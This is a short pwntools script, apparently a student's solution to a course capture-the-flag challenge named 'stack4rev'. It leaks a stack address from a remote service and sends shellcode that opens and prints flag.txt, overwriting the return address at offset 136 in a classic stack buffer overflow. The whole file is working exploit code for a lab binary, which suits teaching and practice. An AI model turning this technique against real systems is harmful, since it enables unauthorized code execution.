# stack4revex.py - Aidan Wech (Onyxymous)
from pwn import *

# debug info
bin64 = './stack4rev'
elf = ELF(bin64)
context.binary = elf
context.log_level = 'debug'

# remote variables
host = 'cs4401shell2.walls.ninja'
port = 14160

# exploit variables
offset = 136
fd = 3

# shellcode
# int fd = open("./flag.txt", 0_RDONLY);
# read(fd, buf, 42) (42 accounts for "picoCTF{" + flag + "}\n")
# write(stdout, buff, 42)
shellcode = asm(shellcraft.amd64.open('flag.txt') + shellcraft.amd64.read(fd, 'rsp', 42) + shellcraft.amd64.write(1, 'rsp', 42))

# remote process
p = remote(host, port)
log.info(p.recvuntil(b': '))

# get msgaddr in code, craft exploit string
msgaddr = int(p.recvline().strip().decode('utf-8'), 16)
log.info(f'Message Address: {hex(msgaddr)}')
exploit = flat({
0: shellcode,
offset: msgaddr})

# send exploit
p.recvline()
p.sendline(exploit)
p.recvline()
log.info(f'Flag: {p.recvline(timeout=1).strip().decode("utf-8")[8:40]}')
